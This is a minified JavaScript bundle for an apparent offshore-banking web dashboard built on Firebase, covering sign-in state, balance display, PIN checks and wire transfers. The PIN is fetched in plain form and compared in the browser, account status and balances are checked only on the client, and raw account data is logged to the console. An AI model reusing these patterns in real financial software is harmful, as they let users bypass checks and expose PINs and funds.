import"./modulepreload-polyfill-B5Qt9EMX.js";import{a as k,d as $}from"./firebase-client-DudADU2j.js";import{onAuthStateChanged as R,signOut as A}from"https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js";import{doc as B,getDoc as v,updateDoc as M}from"https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";import"./firebase-config-CJaibweW.js";import"https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";window.auth=k;window.db=$;window.executeTransfer=async function(){try{const o=window.auth.currentUser;if(!o)throw new Error("No user is signed in");const t=B(window.db,"users",o.uid),i=await v(t);if(!i.exists())throw new Error("User account not found");const e=i.data();switch((e.status||"inactive").toLowerCase()){case"suspended":throw new Error("Your account is currently suspended. Please contact support for assistance.");case"inactive":throw new Error("Your account is inactive. Please activate your account to make transfers.");case"banned":throw new Error("This account has been banned. Please contact support for more information.");case"processing":throw new Error("Your account is currently under review. Please try again later.");case"active":break;default:throw new Error("Unable to verify account status. Please contact support.")}let r=document.getElementById("bankName").value,a=document.getElementById("accountNumber").value,s=document.getElementById("accountName").value,c=parseFloat(document.getElementById("withdrawCash").value.replace(/[^0-9.]/g,""))||0,l=document.getElementById("swiftCode").value,I=document.getElementById("paymentDescription").value,C="TRX"+Math.floor(Math.random()*1e6);const T=document.getElementById("fundingSource"),f=T?T.value:"";if(!f)throw new Error("Funding source is required");let d=0,g="";if(f==="fixed_offshore"){const u=e.deposit??0;d=typeof u=="string"?parseFloat(u.replace(/[^0-9.-]/g,""))||0:parseFloat(u)||0,g="Checking Offshore"}else if(f==="savings_offshore"){const u=e.fixed??0;d=typeof u=="string"?parseFloat(u.replace(/[^0-9.-]/g,""))||0:parseFloat(u)||0,g="Savings Offshore"}if((isNaN(d)||d<0)&&(d=0),console.log("Final balance check in executeTransfer:",{fundingSource:f,accountType:g,transferAmount:c,accountBalance:d,rawUserData:{deposit:e.deposit,fixed:e.fixed,savings:e.savings,checking:e.checking,wallet:e.wallet,profit:e.profit,fixed_offshore:e.fixed_offshore,savings_offshore:e.savings_offshore}}),c>d)throw new Error(`Insufficient funds available in ${g}`);const D=c*1e-4,L=new Date,b=L.toLocaleTimeString("en-US",{hour12:!0,hour:"2-digit",minute:"2-digit"}),P=L.toLocaleDateString("en-US",{month:"2-digit",day:"2-digit",year:"numeric"}),E=new Intl.NumberFormat("en-US",{style:"currency",currency:"USD",minimumFractionDigits:2,maximumFractionDigits:2}).format(c),w=`${r} - Beal-Offshore  |  Transfer-Intl  |  ${E} |  ${b}  |  ${P}  |  Pending`,S=e.pending1||"",N=e.pending2||"",U=e.pending3||"";let m="",h={};if(!S)m="pending1",h={pending1:w};else if(!N)m="pending2",h={pending2:w};else if(!U)m="pending3",h={pending3:w};else throw document.getElementById("pendingLimitReached").classList.remove("hidden"),new Error("Maximum pending transactions reached. This transaction has been queued as you have 3 pending transactions already. Cheers!");m&&(await M(t,h),console.log(`Transfer string saved in Firebase as ${m}:`,w));const F={bankName:r,accountNumber:a,accountName:s,transferAmount:E,swiftCode:l,transferType:selectedTransferType||"Domestic",paymentDescription:I,transactionRef:C,fee:D.toFixed(2),pendingSlot:m};await sendTransferDetails(F),document.getElementById("beneficiaryName").innerText=s,document.getElementById("beneficiaryAccount").innerText=a,document.getElementById("beneficiaryBank").innerText=r,document.getElementById("transferAmount").innerText=E,document.getElementById("transferFee").innerText=`$${D.toFixed(2)}`,document.getElementById("transactionRef").innerText=C,document.getElementById("receiptPaymentDescription").innerText=I||"-",selectedTransferType==="International"&&l?(document.getElementById("swiftCodeReceiptSection").classList.remove("hidden"),document.getElementById("receiptSwiftCode").innerText=l):document.getElementById("swiftCodeReceiptSection").classList.add("hidden"),document.getElementById("spinner").classList.add("hidden"),document.getElementById("successModal").classList.remove("hidden")}catch(o){console.error("Error executing transfer:",o),document.getElementById("spinner").classList.add("hidden"),showErrorModal(o.message)}};let x=!1,p=!1,y=null;R(window.auth,async o=>{if(y&&(clearTimeout(y),y=null),o){p=!0,x=!0;const t=document.getElementById("Deposit-account"),i=document.getElementById("Profit-wallet"),e=document.getElementById("wallet"),n=document.getElementById("welcome-message");t&&(t.textContent="Loading..."),i&&(i.textContent="Loading..."),e&&(e.textContent="Loading..."),n&&(n.textContent="Loading...");try{const r=B(window.db,"users",o.uid),a=await Promise.race([v(r),new Promise((s,c)=>setTimeout(()=>c(new Error("Timeout")),2e3))]);if(a.exists()){const s=a.data();t&&(t.textContent=`${s.deposit||"0.00"}`),i&&(i.textContent=`${s.profit||"0.00"}`),e&&(e.textContent=`${s.wallet||"0.00"}`),n&&(n.textContent=`Welcome ${s.name||s.firstName||"User"}`)}else console.log("No user document found in Firestore."),t&&(t.textContent="0.00"),i&&(i.textContent="0.00"),e&&(e.textContent="0.00"),n&&(n.textContent="Welcome User")}catch(r){console.error("Error loading user data:",r),t&&(t.textContent="0.00"),i&&(i.textContent="0.00"),e&&(e.textContent="0.00"),n&&(n.textContent="Welcome User")}}else x||(await new Promise(t=>setTimeout(t,500)),x=!0),p?console.log("User state changed to null, but user was previously authenticated. Waiting..."):y=setTimeout(()=>{const t=window.auth.currentUser;!t&&!p?(console.log("No user signed in after verification. Redirecting to sign-in page."),window.location.href="login.html"):t&&(console.log("Auth state changed - user is now authenticated, canceling redirect"),p=!0)},1e3)});window.signOut=function(){A(window.auth).then(()=>{alert("Signed out successfully!"),window.location.href="login.html"}).catch(o=>{alert("Error signing out: "+o.message)})};window.validatePin=async function(){const o=document.getElementById("securityPin").value.trim(),t=document.getElementById("confirmButton"),i=document.getElementById("confirmButtonText"),e=document.getElementById("confirmButtonLoader"),n=document.getElementById("securityPinError");n.classList.add("hidden"),t.disabled=!0,i.textContent="Processing...",e.classList.remove("hidden"),document.getElementById("spinner").classList.remove("hidden");try{const r=window.auth.currentUser;if(r){const a=B(window.db,"users",r.uid),s=await v(a);if(s.exists()){const l=s.data().pin;l?o===l?(document.getElementById("securityPinModal").classList.add("hidden"),executeTransfer()):(n.textContent="Incorrect Pin. Please try again.",n.classList.remove("hidden")):(n.textContent="Please update your PIN in settings.",n.classList.remove("hidden"),window.location.href="pin.html")}}}catch(r){console.error("Error validating PIN:",r),n.textContent="Error validating PIN. Please try again.",n.classList.remove("hidden")}finally{t.disabled=!1,i.textContent="Confirm",e.classList.add("hidden"),document.getElementById("spinner").classList.add("hidden")}};document.addEventListener("DOMContentLoaded",function(){const o=document.getElementById("confirmButton");o&&o.addEventListener("click",window.validatePin)});
